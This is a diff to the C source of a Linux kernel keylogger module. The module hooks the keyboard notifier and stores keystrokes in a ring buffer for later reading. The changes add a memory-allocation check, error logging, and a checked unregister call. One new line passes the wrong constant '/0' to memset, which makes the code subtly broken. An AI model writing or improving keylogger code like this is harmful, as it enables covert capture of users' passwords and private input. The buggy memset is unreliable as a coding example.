@@ -18,9 +18,8 @@ void save_key(char key)
 }
 
 /**
-    Don't forget to kfree this after using
-    Call this and you'll have BUFFER_SIZE chars to print
-    All \0 is non inputs (should not print)
+* This needs to be freed after using
+* This needs to be checked for failing to allocate memory 
 */
 char *read_key_history(void)
 {
@@ -29,9 +28,13 @@ char *read_key_history(void)
 	char *consumed_items = (char *)kmalloc(
 		num_items_to_consume * sizeof(char), GFP_KERNEL);
 
-	for (int i = 0; i < num_items_to_consume; i++) {
-		consumed_items[i] = '\0';
+	if (!consumed_items) {
+		printk(KERN_ERR
+		       "Failed to allocate memory for consumed items\n");
+		return NULL;
 	}
+
+	memset(consumed_items, '/0', num_items_to_consume * sizeof(char));
 
 	while (consumed_count < num_items_to_consume) {
 		char item = buffer[(fill - consumed_count - 1 + BUFFER_SIZE) %
@@ -57,6 +60,8 @@ irqreturn_t keyboard_interrupt_handler(int irq, void *dev_id)
 		char key = (char)keycode;
 
 		save_key(key);
+	} else {
+		printk(KERN_ERR "Invalid keyboard interrupt parameters\n");
 	}
 
 	return IRQ_NONE;
@@ -80,10 +85,8 @@ struct notifier_block keyboard_notifier_block = {
 
 int __init keylogger_module_init(void)
 {
-	int result;
+	int result = register_keyboard_notifier(&keyboard_notifier_block);
 
-	// Register the keyboard notifier
-	result = register_keyboard_notifier(&keyboard_notifier_block);
 	if (result != 0) {
 		printk(KERN_ERR "Failed to register keyboard notifier\n");
 		return result;
@@ -96,7 +99,12 @@ int __init keylogger_module_init(void)
 void __exit keylogger_module_exit(void)
 {
 	// Unregister the keyboard notifier
-	unregister_keyboard_notifier(&keyboard_notifier_block);
+	int result = unregister_keyboard_notifier(&keyboard_notifier_block);
+
+	if (result != 0) {
+		printk(KERN_ERR "Failed to unregister keyboard notifier: %d\n",
+		       result);
+	}
 
 	printk(KERN_INFO "Keylogger module exited\n");
 }
